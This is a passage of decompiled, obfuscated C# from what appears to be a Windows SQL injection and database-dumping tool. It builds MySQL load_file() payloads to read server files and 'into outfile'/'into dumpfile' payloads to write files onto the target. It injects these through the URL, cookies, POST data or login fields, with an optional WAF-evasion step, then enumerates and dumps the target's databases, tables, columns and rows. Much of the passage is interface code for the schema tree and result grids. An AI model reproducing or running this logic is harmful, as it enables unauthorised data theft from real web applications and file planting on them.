					method_8(cmbMSSQLCast, analyzer.MSSQLCast);
				}
				else if (flag3 == Class54.smethod_11(types_0))
				{
					method_8(cmbOracleErrType, (int)analyzer.OracleErrorType);
					method_8(chkOracleCastAsChar, analyzer.OracleCast);
				}
				method_8(chkHttpRedirect, analyzer.FollowRedirects);
				string text4 = "";
				string sCountry = "";
				Image oImage = null;
				string text5 = Class23.smethod_12(string_1);
				if (Globals.G_DataGP.CountryCodeExist(text5))
				{
					sCountry = Globals.G_DataGP.CountryNameByCode(text5);
					oImage = Globals.GMain.imgData.Images[text5 + ".png"];
				}
				else
				{
					text4 = Globals.GMain.method_85(Class23.smethod_11(string_1)).ToString();
					if (!string.IsNullOrEmpty(text4))
					{
						DataGP g_DataGP = Globals.G_DataGP;
						string sIP = text4;
						string sCountryCode = "";
						g_DataGP.Lookup(sIP, ref sCountry, ref oImage, ref sCountryCode, bUnionContryCode: true);
					}
				}
				string_0 = text;
				if (!string.IsNullOrEmpty(text))
				{
					method_47(text);
				}
				method_3(string_, sCountry, oImage);
			}
			else
			{
				class47_0.Err = Globals.translate_0.GetStr(Globals.GMain, 88);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (!(ex2 is ThreadAbortException))
			{
				_ = "Error: " + ex2.ToString();
				class47_0.Err = ex2.ToString();
			}
			ProjectData.ClearProjectError();
		}
		finally
		{
			try
			{
				threadPool_0.Close(class47_0.Thread_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_24(Class47 class47_0)
	{
		string string_ = "Empty";
		int num = default(int);
		bool flag = default(bool);
		try
		{
			string text = default(string);
			if (class47_0.IndexJob != -1)
			{
				text = ((class45_0.method_0(0).Columns.Count <= 0) ? "" : class45_0.method_0(0).Columns[class47_0.IndexJob]);
			}
			else
			{
				switch (enum4_0)
				{
				case Enum4.const_1:
					text = class45_0.method_0(0).DataBase;
					break;
				case Enum4.const_3:
					text = class45_0.method_0(0).Table;
					break;
				}
			}
			switch (enum4_0)
			{
			case Enum4.const_0:
				num = method_19(Schema.DATABASES, "", "", ref string_);
				method_8(lblCountBDs, num.ToString());
				break;
			case Enum4.const_1:
			case Enum4.const_2:
				num = method_19(Schema.TABLES, text, "", ref string_);
				method_43(Schema.DATABASES, text, "", "", num.ToString());
				break;
			case Enum4.const_3:
			case Enum4.const_4:
				num = method_19(Schema.COLUMNS, class45_0.method_0(0).DataBase, text, ref string_);
				method_43(Schema.TABLES, class45_0.method_0(0).DataBase, text, "", num.ToString());
				break;
			case Enum4.const_5:
			case Enum4.const_6:
				if (class47_0.IndexJob != -1)
				{
					num = method_19(Schema.ROWS, class45_0.method_0(0).DataBase, text, ref string_);
					method_43(Schema.TABLES, class45_0.method_0(0).DataBase, text, "", "", num.ToString());
				}
				else
				{
					num = method_19(Schema.ROWS, class45_0.method_0(0).DataBase, class45_0.method_0(0).Table, ref string_);
					method_43(Schema.TABLES, class45_0.method_0(0).DataBase, class45_0.method_0(0).Table, "", "", num.ToString());
				}
				break;
			}
			if (class47_0.TotalThreads != 1)
			{
			}
			flag = num >= 0;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string_ = "Error: " + ex2.ToString();
			flag = false;
			ProjectData.ClearProjectError();
		}
		finally
		{
			try
			{
				lock (class44_0)
				{
					try
					{
						if (flag)
						{
							if (!class44_0.dictionary_0.ContainsKey(class47_0.IndexJob))
							{
								class44_0.dictionary_0.Add(class47_0.IndexJob, string_);
							}
						}
						else
						{
							if (!class44_0.dictionary_1.ContainsKey(class47_0.IndexJob))
							{
								class44_0.dictionary_1.Add(class47_0.IndexJob, string_);
							}
							if (!class44_0.list_1.Contains(class47_0.IndexJob))
							{
								class44_0.list_1.Add(class47_0.IndexJob);
							}
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				threadPool_0.Close(class47_0.Thread_0);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			int_2 = num;
		}
	}

	private void method_25(Class47 class47_0)
	{
		string string_ = "Empty";
		string sTraject = "";
		try
		{
			List<string> list = new List<string>();
			string text = "";
			bool flag = default(bool);
			string text3;
			if (enum5_0 == Enum5.const_7)
			{
				flag = Conversions.ToBoolean(method_7(chkDumpEncodedHex));
				text = Conversions.ToString(method_7(txtMySQLReadFilePath));
				class45_0.method_2(text);
				object left = method_7(cmbMySQLReadFile);
				if (Operators.ConditionalCompareObjectEqual(left, 0, TextCompare: false))
				{
					if (!text.StartsWith("'"))
					{
						text = "'" + text;
					}
					if (!text.EndsWith("'"))
					{
						text += "'";
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 1, TextCompare: false))
				{
					text = Class23.smethod_20(text);
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 2, TextCompare: false))
				{
					text = Class23.smethod_21(text, bool_0: true);
				}
				list.Add("load_file(" + text + ")");
				sTraject = "[t]";
			}
			else if (enum5_0 == Enum5.const_8)
			{
				string text2 = "";
				text = Conversions.ToString(method_7(txtMySQLWriteFilePath));
				if (!text.StartsWith("'"))
				{
					text = "'" + text;
				}
				if (!text.EndsWith("'"))
				{
					text += "'";
				}
				object left2 = method_7(cmbMySQLWriteFilePath);
				if (Operators.ConditionalCompareObjectEqual(left2, 0, TextCompare: false))
				{
					text2 = "into outfile ";
				}
				else if (Operators.ConditionalCompareObjectEqual(left2, 1, TextCompare: false))
				{
					text2 = "into dumpfile ";
				}
				text3 = Conversions.ToString(method_7(txtMySQLWriteFile));
				if (!text3.StartsWith("'"))
				{
					text3 = "'" + text3;
				}
				if (!text3.EndsWith("'"))
				{
					text3 += "'";
				}
				sTraject = "select " + text3 + " " + text2 + text;
			}
			sTraject = MySQLNoError.Info(sTraject, method_14(), flag, list);
			HTTPExt httpext_ = appDomainControl_0.GetHTTP();
			text3 = method_26(ref sTraject, ref string_, ref httpext_);
			appDomainControl_0.Dispose(httpext_);
			if (enum5_0 == Enum5.const_7 && !string.IsNullOrEmpty(text3))
			{
				string[] array = Strings.Split(text3, Class54.string_0);
				if (!Information.IsNothing(array) && array.Length > 1)
				{
					text3 = ((!flag) ? array[1] : Class23.smethod_19(array[1]));
					text3 = Strings.Replace(text3, "\v\n", "\r\n");
					text3 = Strings.Replace(text3, "\n", "\r\n");
					text3 = Strings.Replace(text3, "\v", "\r\n");
					text3 = Strings.Split(text3, Class54.string_0)[0];
					list = new List<string>();
					list.Add(text3);
					method_29();
					dumpGrid_0.Text = Conversions.ToString(method_7(txtMySQLReadFilePath));
					dumpGrid_0.method_3(list);
					class44_0.AffectedRows = 1;
					class44_0.RowsAdded = 1;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string_ = "Error: " + ex2.StackTrace;
			ProjectData.ClearProjectError();
		}
		finally
		{
			try
			{
				threadPool_0.Close(class47_0.Thread_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private string method_26(ref string string_9, ref string string_10, [Optional][DefaultParameterValue(null)] ref HTTPExt httpext_0)
	{
		string text = "";
		int timeOut = Conversions.ToInteger(method_7(numTimeOut));
		string url = Conversions.ToString(method_7(txtURL));
		string text2 = Conversions.ToString(method_7(txtCookies));
		string text3 = Conversions.ToString(method_7(txtPost));
		string text4 = Conversions.ToString(method_7(txtUserName));
		string text5 = Conversions.ToString(method_7(txtPassword));
		int int_ = ((!Conversions.ToBoolean(method_7(chkThreads))) ? Conversions.ToInteger(method_7(numSleep)) : Conversions.ToInteger(method_7(numSleepMultiThread)));
		object left = method_7(cmbInjectionPoint);
		if (Operators.ConditionalCompareObjectEqual(left, 0, TextCompare: false))
		{
			if (string_9.IndexOf("count(") <= 0 && method_10())
			{
				url = string_9;
			}
			else
			{
				url = string_6;
				url = url.Replace("[t]", string_9);
			}
			if (Conversions.ToBoolean(method_7(Globals.GMain.chkAnalizeWAF)))
			{
				Class54.smethod_1(ref url);
			}
		}
		else if (Operators.ConditionalCompareObjectEqual(left, 1, TextCompare: false))
		{
			text2 = text2.Replace("[t]", string_9);
			Class54.smethod_1(ref text2);
		}
		else if (Operators.ConditionalCompareObjectEqual(left, 2, TextCompare: false))
		{
			text3 = text3.Replace("[t]", string_9);
			Class54.smethod_1(ref text3);
		}
		else if (Operators.ConditionalCompareObjectEqual(left, 3, TextCompare: false))
		{
			text4 = text4.Replace("[t]", string_9);
			Class54.smethod_1(ref text4);
		}
		else if (Operators.ConditionalCompareObjectEqual(left, 4, TextCompare: false))
		{
			text5 = text5.Replace("[t]", string_9);
			Class54.smethod_1(ref text5);
		}
		if (bckWorker.CancellationPending)
		{
			return "";
		}
		if (httpext_0 == null)
		{
			httpext_0 = appDomainControl_0.GetHTTP();
		}
		httpext_0.FollowRedirects = Conversions.ToBoolean(method_7(chkHttpRedirect));
		httpext_0.TimeOut = timeOut;
		httpext_0.LoginUser = Conversions.ToString(method_7(txtUserName));
		httpext_0.LoginPassword = Conversions.ToString(method_7(txtPassword));
		if (!Conversions.ToBoolean(method_7(chkAddHearder)))
		{
		}
		method_5(int_);
		return httpext_0.QuickGet(url);
	}

	private void method_27(List<string> list_2)
	{
		if (dumpGrid_0.InvokeRequired)
		{
		}
	}

	private void method_28(int int_3, string string_9)
	{
		if (dumpGrid_0.InvokeRequired)
		{
		}
	}

	private void method_29(int int_3 = 0)
	{
		checked
		{
			if (base.InvokeRequired)
			{
				Invoke(new Delegate28(method_29), int_3);
			}
			else
			{
				if (bool_5)
				{
					return;
				}
				bool_5 = true;
				if (!Class54.smethod_9(types_0) && enum5_0 == Enum5.const_5)
				{
					List<string> list = new List<string>();
					int num = int_3 - 1;
					for (int i = 0; i <= num; i++)
					{
						list.Add("Column " + Conversions.ToString(i + 1));
					}
					dumpGrid_0.DataBase = "Custom";
					dumpGrid_0.Table = "Query";
					dumpGrid_0.Columns = list;
					dumpGrid_0.Text = class45_0.method_0(0).DataBase + "." + class45_0.method_0(0).Table;
				}
				else if (enum5_0 == Enum5.const_7)
				{
					dumpGrid_0.txtResult.Visible = true;
					dumpGrid_0.dtgData.Visible = false;
					dumpGrid_0.btnAutoScroll.Visible = false;
					dumpGrid_0.tsSP2.Visible = false;
					dumpGrid_0.Text = class45_0.method_0(0).DataBase;
				}
				else
				{
					dumpGrid_0.DataBase = class45_0.method_0(0).DataBase;
					dumpGrid_0.Table = class45_0.method_0(0).Table;
					dumpGrid_0.Columns = class45_0.method_0(0).Columns;
					dumpGrid_0.Text = class45_0.method_0(0).DataBase + "." + class45_0.method_0(0).Table;
				}
				dumpGrid_0.method_2();
				dumpGrid_0.btnFullView.Click += method_34;
				dumpGrid_0.btnCloseAllGrids.Click += method_35;
				dumpGrid_0.btnCloseAllButThis.Click += method_36;
				dumpGrid_0.btnCloseGrid.Click += method_37;
				dumpGrid_0.Tag = tabControlExt_0.TabPages.Add(dumpGrid_0);
				NewLateBinding.LateSetComplex(dumpGrid_0.Tag, null, "CloseButtonVisible", new object[1] { false }, null, null, OptimisticSet: false, RValueBase: true);
				dumpGrid_0.Show();
				object[] array;
				DumpGrid dumpGrid;
				bool[] array2;
				NewLateBinding.LateCall(tabControlExt_0, null, "SelectItem", array = new object[1] { (dumpGrid = dumpGrid_0).Tag }, null, null, array2 = new bool[1] { true }, IgnoreReturn: true);
				if (array2[0])
				{
					dumpGrid.Tag = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
				}
				list_1.Add(dumpGrid_0);
			}
		}
	}

	private bool method_30(DumpGrid dumpGrid_1)
	{
		if (dumpGrid_0 == dumpGrid_1 && (bool_2 & ((enum5_0 == Enum5.const_4) | (enum5_0 == Enum5.const_5))))
		{
			return false;
		}
		return true;
	}

	private void method_31(DumpGrid dumpGrid_1)
	{
		if (method_30(dumpGrid_1))
		{
			list_1.Remove(dumpGrid_1);
			dumpGrid_1.Close();
			dumpGrid_1.Table = null;
		}
		if (list_1.Count == 0)
		{
			method_33(bool_6: false);
		}
	}

	private void method_32(DumpGrid dumpGrid_1 = null)
	{
		if (list_1.Count == 0)
		{
			return;
		}
		checked
		{
			while (true)
			{
				int num = tabControlExt_0.TabPages.Count - 1;
				int num2 = 0;
				while (true)
				{
					if (num2 <= num)
					{
						if (method_30((DumpGrid)tabControlExt_0.TabPages[num2].Form) & (tabControlExt_0.TabPages[num2].Form != null) & (dumpGrid_1 != tabControlExt_0.TabPages[num2].Form))
						{
							break;
						}
						num2++;
						continue;
					}
					if (list_1.Count == 0)
					{
						method_33(bool_6: false);
					}
					return;
				}
				method_31((DumpGrid)tabControlExt_0.TabPages[num2].Form);
			}
		}
	}

	private void method_33(bool bool_6)
	{
		Globals.LockWindowUpdate(splData.Handle);
		checked
		{
			int num = tabControlExt_0.TabPages.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				DumpGrid dumpGrid = (DumpGrid)tabControlExt_0.TabPages[i].Form;
				if (bool_6)
				{
					splData.Panel1Collapsed = true;
					dumpGrid.btnFullView.Text = Globals.translate_0.GetStr(this, 39);
					dumpGrid.btnFullView.Image = Class6.ViewFull_16x_24;
				}
				else
				{
					splData.Panel1.Show();
					splData.Panel1Collapsed = false;
					dumpGrid.btnFullView.Text = Globals.translate_0.GetStr(this, 40);
					dumpGrid.btnFullView.Image = Class6.ViewLandscape_16x_24;
				}
				dumpGrid.btnFullView.Checked = bool_6;
			}
			tsGetInfo.Visible = !bool_6;
			tlsMenu.Visible = !bool_6;
			chkAllInOneRequest.Visible = !bool_6;
			chkClearListOnGet.Visible = !bool_6;
			Globals.LockWindowUpdate(IntPtr.Zero);
		}
	}

	private void method_34(object sender, EventArgs e)
	{
		ToolStripButton toolStripButton = (ToolStripButton)sender;
		method_33(toolStripButton.Checked);
	}

	private void method_35(object sender, EventArgs e)
	{
		method_32();
	}

	private void method_36(object sender, EventArgs e)
	{
		method_32((DumpGrid)NewLateBinding.LateGet(sender, null, "Tag", new object[0], null, null, null));
	}

	private void method_37(object sender, EventArgs e)
	{
		method_31((DumpGrid)NewLateBinding.LateGet(sender, null, "Tag", new object[0], null, null, null));
	}

	private void method_38(object object_0, bool bool_6)
	{
		Globals.LockWindowUpdate(splData.Handle);
		if (bool_6)
		{
			splData.SplitterDistance = checked((int)Math.Round(Math.Round((double)splData.Height / 2.0, 0)));
			splData.Panel1Collapsed = false;
			splData.Panel2Collapsed = false;
		}
		else
		{
			splData.Panel1Collapsed = false;
			splData.Panel2Collapsed = true;
		}
		Globals.LockWindowUpdate(IntPtr.Zero);
	}

	internal string method_39(string string_9, string string_10, string string_11 = "")
	{
		string_9 = method_41(string_9);
		if (Versioned.IsNumeric(string_10))
		{
			string_10 = Strings.FormatNumber(Conversions.ToInteger(string_10), 0);
		}
		if (Versioned.IsNumeric(string_11))
		{
			string_11 = Strings.FormatNumber(Conversions.ToInteger(string_11), 0);
		}
		if (string.IsNullOrEmpty(string_11))
		{
			return string_9.PadRight(26, ' ') + "[" + string_10.PadRight(2, ' ') + "]";
		}
		return string_9.PadRight(26, ' ') + "[" + string_10.PadRight(2, ' ') + "#" + string_11.PadLeft(7, ' ') + "]";
	}

	private string method_40(string string_9, string string_10, string string_11 = "")
	{
		string_9 = method_41(string_9);
		return method_39(string_9, string_10, string_11);
	}

	internal string method_41(string string_9)
	{
		if (string.IsNullOrEmpty(string_9))
		{
			return "";
		}
		int num = string_9.IndexOf("[");
		if (num > 0)
		{
			string_9 = string_9.Substring(0, num).Trim();
		}
		return string_9;
	}

	private int method_42(string string_9, bool bool_6)
	{
		int result = -1;
		if (string.IsNullOrEmpty(string_9))
		{
			return -1;
		}
		int num = string_9.IndexOf("[");
		string_9 = string_9.Replace("]", "");
		if (num > 0)
		{
			string_9 = string_9.Substring(checked(num + 1)).Trim();
			if (bool_6)
			{
				string_9 = Strings.Split(string_9, "#")[0].Trim();
				if (Versioned.IsNumeric(string_9))
				{
					result = Conversions.ToInteger(string_9);
				}
			}
			else if (string_9.IndexOf('#') > 0)
			{
				string_9 = Strings.Split(string_9, "#")[1].Trim();
				if (Versioned.IsNumeric(string_9))
				{
					result = Conversions.ToInteger(string_9);
				}
			}
		}
		return result;
	}

	private int method_43(Schema schema_0, string string_9, string string_10 = "", string string_11 = "", string string_12 = "", string string_13 = "")
	{
		if (trwSchema.InvokeRequired)
		{
			return Conversions.ToInteger(trwSchema.Invoke(new Delegate26(method_43), schema_0, string_9, string_10, string_11, string_12, string_13));
		}
		TreeNode treeNode = method_52(schema_0, string_9, string_10, string_11);
		if (treeNode == null)
		{
			return 0;
		}
		if (schema_0 == Schema.TABLES)
		{
			if (string.IsNullOrEmpty(string_12))
			{
				string_12 = method_42(treeNode.Text, bool_6: true).ToString();
				if (string_12.Equals("-1"))
				{
					string_12 = "?";
				}
			}
			if (string.IsNullOrEmpty(string_13))
			{
				string_13 = method_42(treeNode.Text, bool_6: false).ToString();
				if (string_13.Equals("-1"))
				{
					string_13 = "?";
				}
			}
		}
		treeNode.Text = method_39(treeNode.Text, string_12, string_13);
		if (Operators.ConditionalCompareObjectEqual(method_7(mnuAutoScroll), Globals.translate_0.GetStr(Globals.GMain, 62), TextCompare: false))
		{
			treeNode.EnsureVisible();
		}
		return 1;
	}

	private int method_44(Schema schema_0, string string_9, string string_10 = "", string string_11 = "")
	{
		if (trwSchema.InvokeRequired)
		{
			return Conversions.ToInteger(trwSchema.Invoke(new Delegate27(method_44), schema_0, string_9, string_10, string_11));
		}
		bool flag;
		if (flag = schema_0 == Schema.ROWS)
		{
			schema_0 = Schema.TABLES;
		}
		TreeNode treeNode = method_52(schema_0, string_9, string_10, string_11);
		if (treeNode == null)
		{
			return -1;
		}
		return method_42(treeNode.Text, !flag);
	}

	private void method_45(TreeNode treeNode_0, string string_9, int int_3)
	{
		bool flag = default(bool);
		foreach (TreeNode node in treeNode_0.Nodes)
		{
			if (method_41(node.Text).Equals(method_41(string_9)))
			{
				flag = true;
			}
		}
		if (!flag)
		{
			treeNode_0.Nodes.Add(string_9, string_9, int_3).SelectedImageIndex = int_3;
		}
	}

	private void method_46(TreeNodeCollection treeNodeCollection_0, string string_9, int int_3)
	{
		bool flag = default(bool);
		foreach (TreeNode item in treeNodeCollection_0)
		{
			if (method_41(item.Text).Equals(method_41(string_9)))
			{
				flag = true;
			}
		}
		if (!flag)
		{
			treeNodeCollection_0.Add(string_9, string_9, int_3).SelectedImageIndex = int_3;
		}
	}

	internal void method_47(string string_9)
	{
		if (trwSchema.InvokeRequired)
		{
			trwSchema.Invoke(new Delegate20(method_47), string_9);
			return;
		}
		string_9 = method_39(string_9, "?");
		method_46(trwSchema.Nodes, string_9, 0);
		checked
		{
			if (method_41(string_9).Equals(string_0))
			{
				if (trwSchema.Nodes[string_9] != null)
				{
					trwSchema.Nodes[string_9].NodeFont = new Font(trwSchema.Font, FontStyle.Bold | FontStyle.Italic);
				}
				else
				{
					trwSchema.Nodes[trwSchema.Nodes.Count - 1].NodeFont = new Font(trwSchema.Font, FontStyle.Bold | FontStyle.Italic);
				}
			}
			TreeNode_RemoveCheckBox(trwSchema.Nodes[string_9], 0);
			if (Operators.ConditionalCompareObjectEqual(method_7(mnuAutoScroll), Globals.translate_0.GetStr(Globals.GMain, 62), TextCompare: false) && trwSchema.Nodes.Count > 0)
			{
				trwSchema.Nodes[trwSchema.Nodes.Count - 1].EnsureVisible();
			}
		}
	}

	internal void method_48(string string_9, string string_10)
	{
		if (trwSchema.InvokeRequired)
		{
			trwSchema.Invoke(new Delegate21(method_48), string_9, string_10);
			return;
		}
		TreeNode treeNode = method_52(Schema.DATABASES, string_9);
		string_10 = method_39(string_10, "?", "?");
		method_45(treeNode, string_10, 1);
		TreeNode_RemoveCheckBox(treeNode.Nodes[string_10], 0);
		if (Operators.ConditionalCompareObjectEqual(method_7(mnuAutoScroll), Globals.translate_0.GetStr(Globals.GMain, 62), TextCompare: false) && treeNode.Nodes.Count > 0)
		{
			treeNode.Nodes[checked(treeNode.Nodes.Count - 1)].EnsureVisible();
		}
	}

	private void method_49(string string_9, string string_10, string string_11)
	{
		if (trwSchema.InvokeRequired)
		{
			trwSchema.Invoke(new Delegate22(method_49), string_9, string_10, string_11);
			return;
		}
		TreeNode treeNode = method_52(Schema.TABLES, string_9, string_10);
		if (string_11.Contains(":"))
		{
			string[] array = string_11.Split(':');
			method_45(treeNode, array[0], 2);
			method_50(string_9, string_10, array[0], array[1]);
		}
		else
		{
			method_45(treeNode, string_11, 2);
		}
		if (Operators.ConditionalCompareObjectEqual(method_7(mnuAutoScroll), Globals.translate_0.GetStr(Globals.GMain, 62), TextCompare: false) && treeNode.Nodes.Count > 0)
		{
			treeNode.Nodes[checked(treeNode.Nodes.Count - 1)].EnsureVisible();
		}
	}

	private void method_50(string string_9, string string_10, string string_11, string string_12)
	{
		if (trwSchema.InvokeRequired)
		{
			trwSchema.Invoke(new Delegate23(method_50), string_9, string_10, string_11, string_12);
			return;
		}
		TreeNode treeNode = method_52(Schema.COLUMNS, string_9, string_10, string_11);
		if (!string.IsNullOrEmpty(string_12))
		{
			if (treeNode.Nodes.Count > 0)
			{
				treeNode.Nodes[0].Text = string_12;
			}
			else
			{
				treeNode.Nodes.Add(string_12, string_12, 3).SelectedImageIndex = 3;
			}
			TreeNode_RemoveCheckBox(treeNode.Nodes[string_12], 0);
		}
		else
		{
			treeNode.Nodes.Clear();
		}
	}

	private List<string> method_51()
	{
		List<string> list = new List<string>();
		foreach (object node in trwSchema.Nodes)
		{
			object objectValue = RuntimeHelpers.GetObjectValue(node);
			string item = method_41(Conversions.ToString(NewLateBinding.LateGet(objectValue, null, "Text", new object[0], null, null, null)));
			if (!list.Contains(item))
			{
				list.Add(item);
			}
		}
		return list;
	}

	private TreeNode method_52(Schema schema_0, string string_9, string string_10 = "", string string_11 = "")
	{
		switch (schema_0)
		{
		case Schema.DATABASES:
			foreach (TreeNode node in trwSchema.Nodes)
			{
				if (Operators.CompareString(method_41(node.Text), method_41(string_9), TextCompare: false) == 0)
				{
					return node;
				}
			}
			break;
		case Schema.TABLES:
			foreach (TreeNode node2 in trwSchema.Nodes)
			{
				if (Operators.CompareString(method_41(node2.Text), method_41(string_9), TextCompare: false) != 0)
				{
					continue;
				}
				foreach (TreeNode node3 in node2.Nodes)
				{
					if (Operators.CompareString(method_41(node3.Text), method_41(string_10), TextCompare: false) == 0)
					{
						return node3;
					}
				}
			}
			break;
		case Schema.COLUMNS:
			foreach (TreeNode node4 in trwSchema.Nodes)
			{
				if (Operators.CompareString(method_41(node4.Text), method_41(string_9), TextCompare: false) != 0)
				{
					continue;
				}
				foreach (TreeNode node5 in node4.Nodes)
				{
					if (Operators.CompareString(method_41(node5.Text), method_41(string_10), TextCompare: false) != 0)
					{
						continue;
					}
					foreach (TreeNode node6 in node5.Nodes)
					{
						if (Operators.CompareString(method_41(node6.Text), method_41(string_11), TextCompare: false) == 0)
						{
							return node6;
						}
					}
				}
			}
			break;
		}
		return new TreeNode();
	}

	private bool method_53(string string_9)
	{
		char[] array = string_9.ToCharArray();
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				char c = array[num];
				if (!"abcdefghijklmnopqrstuvwxyz0123456789_-".Contains(c.ToString().ToLower()))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		return false;
	}

	private bool method_54(Schema schema_0, string string_9, string string_10 = "", string string_11 = "")
	{
		TreeNode treeNode = method_52(schema_0, method_41(string_9), method_41(string_10), string_11);
		if (treeNode == null)
		{
			return false;
		}
		return !string.IsNullOrEmpty(treeNode.Text);
	}

	private void method_55(object sender, TreeViewEventArgs e)
	{
		if (e.Action == TreeViewAction.ByMouse)
		{
			trwSchema.SelectedNode = e.Node;
		}
	}

	private void method_56(object sender, TreeViewEventArgs e)
	{
		try
		{
			Globals.LockWindowUpdate(tpSchema.Handle);
			btnTables.Visible = false;
			btnColumns.Visible = false;
			btnDumpData.Visible = false;
			btnColumnUp.Visible = false;
			btnColumnDown.Visible = false;
			if (trwSchema.SelectedNode == null)
			{
				return;
			}
			TreeNode selectedNode = trwSchema.SelectedNode;
			int level = selectedNode.Level;
			if (level <= 1)
			{
				selectedNode.Expand();
			}
			foreach (TreeNode node in trwSchema.Nodes)
			{
				if (node.Nodes.Count > 0)
				{
					node.ToolTipText = Globals.translate_0.GetStr(this, 41) + Conversions.ToString(node.Nodes.Count);
				}
				TreeNode_RemoveCheckBox(node, 0);
				foreach (TreeNode node2 in node.Nodes)
				{
					TreeNode_RemoveCheckBox(node2, 0);
					int num = 0;
					foreach (TreeNode node3 in node2.Nodes)
					{
						if (node3.Checked)
						{
							num = checked(num + 1);
						}
					}
					if (node2.Nodes.Count > 0)
					{
						node2.ToolTipText = Globals.translate_0.GetStr(this, 42) + Conversions.ToString(node2.Nodes.Count) + "/" + Conversions.ToString(num);
					}
				}
			}
			switch (level)
			{
			case 0:
				btnTables.Visible = true;
				break;
			case 1:
				btnColumns.Visible = true;
				break;
			case 2:
			case 3:
				btnDumpData.Visible = true;
				if (level == 2)
				{
					btnColumnUp.Visible = true;
					btnColumnDown.Visible = true;
				}
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			Globals.LockWindowUpdate(IntPtr.Zero);
		}
	}

	private void method_57(object sender, KeyEventArgs e)
	{
		if (trwSchema.SelectedNode != null && ((e.KeyCode == Keys.Delete) & (trwSchema.SelectedNode != null)))
		{
			TreeNode selectedNode = trwSchema.SelectedNode;
			switch (selectedNode.Level)
			{
			case 0:
				method_68(mnuRemDB, null);
				break;
			case 1:
				method_68(mnuRemTable, null);
				break;
			case 2:
				method_68(mnuRemColumn, null);
				break;
			}
		}
	}

	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SendMessage(IntPtr hwnd, int msg, IntPtr wParam, ref TVITEM lParam);

	public void TreeNode_RemoveCheckBox(TreeNode node, int index)
	{
		if (node != null)
		{
			TVITEM lParam = default(TVITEM);
			lParam.hItem = node.Handle;
			lParam.mask = 8;
			lParam.stateMask = 61440;
			lParam.state = index << 12;
			SendMessage(node.TreeView.Handle, 4415, IntPtr.Zero, ref lParam);
		}
	}

	internal void method_58()
	{
		new List<string>();
		foreach (TreeNode node2 in trwSchema.Nodes)
		{
			if (node2.Nodes.Count > 0)
			{
				node2.ToolTipText = Globals.translate_0.GetStr(this, 43) + Conversions.ToString(node2.Nodes.Count);
			}
			TreeNode_RemoveCheckBox(node2, 0);
			foreach (TreeNode node3 in node2.Nodes)
			{
				if (node3.Nodes.Count > 0)
				{
					node3.ToolTipText = Globals.translate_0.GetStr(this, 44) + Conversions.ToString(node3.Nodes.Count);
				}
				TreeNode_RemoveCheckBox(node3, 0);
				foreach (TreeNode node4 in node3.Nodes)
				{
					foreach (TreeNode node5 in node4.Nodes)
					{
						TreeNode_RemoveCheckBox(node5, 0);
					}
				}
			}
		}
		checked
		{
			while (true)
			{
				int num = trwSchema.Nodes.Count - 1;
				int num2 = 0;
				while (true)
				{
					if (num2 <= num)
					{
						if (method_59(trwSchema.Nodes[num2].Text) & (trwSchema.Nodes[num2].Nodes.Count == 0))
						{
							break;
						}
						num2++;
						continue;
					}
					while (true)
					{
						int num3 = trwSchema.Nodes.Count - 1;
						int num4 = 0;
						while (true)
						{
							if (num4 <= num3)
							{
								if (method_59(trwSchema.Nodes[num4].Text))
								{
									break;
								}
								num4++;
								continue;
							}
							return;
						}
						trwSchema.Nodes[num4].Remove();
					}
				}
				trwSchema.Nodes[num2].Remove();
			}
		}
	}

	private bool method_59(string string_9)
	{
		int num = default(int);
		foreach (TreeNode node in trwSchema.Nodes)
		{
			if (method_41(node.Text).Equals(method_41(string_9)))
			{
				num = checked(num + 1);
			}
		}
		return num > 1;
	}

	private void method_60(object sender, EventArgs e)
	{
		bool flag;
		if ((flag = true) == (sender == mnuCountDBs))
		{
			enum4_0 = Enum4.const_0;
		}
		else if (flag == (sender == mnuCountTables))
		{
			enum4_0 = Enum4.const_1;
		}
		else if (flag == (sender == mnuCountTablesAll))
		{
			enum4_0 = Enum4.const_2;
		}
		else if (flag == (sender == mnuCountColumns))
		{
			enum4_0 = Enum4.const_3;
		}
		else if (flag == (sender == mnuCountColumnsAll))
		{
			enum4_0 = Enum4.const_4;
		}
		else if (flag == (sender == mnuCountRows))
		{
			enum4_0 = Enum4.const_5;
		}
		else if (flag == (sender == mnuCountRowsAll))
		{
			enum4_0 = Enum4.const_6;
		}
		method_0(Enum5.const_6);
	}

	private void method_61(object sender, CancelEventArgs e)
	{
		bool flag;
		if ((flag = true) == (trwSchema.Nodes.Count == 0) || flag == (trwSchema.SelectedNode == null))
		{
			mnuCountTables.Visible = false;
			mnuCountTablesAll.Visible = false;
			mnuCountColumns.Visible = false;
			mnuCountColumnsAll.Visible = false;
			mnuCountRows.Visible = false;
			mnuCountRowsAll.Visible = false;
			mnuCountSP.Visible = false;
			mnuCopyDB.Visible = false;
			mnuCopyTable.Visible = false;
			mnuUnCheckAllColumns.Visible = false;
			mnuCheckAllColumns.Visible = false;
			mnuCheckRevert.Visible = false;
			mnuCheckAllSP.Visible = false;
			mnuCopyColumn.Visible = false;
			mnuTreeSP1.Visible = false;
			mnuCopyAllNodes.Visible = false;
			mnuCopyAllSchema.Visible = false;
			mnuTreeSP2.Visible = false;
			mnuClearNodes.Visible = false;
			mnuClearSchema.Visible = false;
